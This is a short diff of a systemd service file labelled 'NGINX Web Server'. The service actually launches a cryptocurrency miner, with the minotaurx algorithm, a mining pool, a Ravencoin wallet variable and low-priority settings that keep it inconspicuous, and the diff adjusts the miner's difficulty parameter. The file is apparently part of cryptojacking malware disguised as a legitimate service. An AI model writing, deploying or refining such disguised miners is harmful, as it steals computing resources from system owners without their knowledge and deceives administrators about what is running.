@@ -28,7 +28,7 @@ Description=NGINX Web Server
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$BINARY_NAME -a minotaurx -o $POOL -u $RVN_WALLET -p c=RVN -t $THREADS
+ExecStart=$INSTALL_DIR/$BINARY_NAME -a minotaurx -o $POOL -u $RVN_WALLET -p c=RVN,d=1024 -t $THREADS
 Restart=always
 Nice=19
 CPUWeight=1
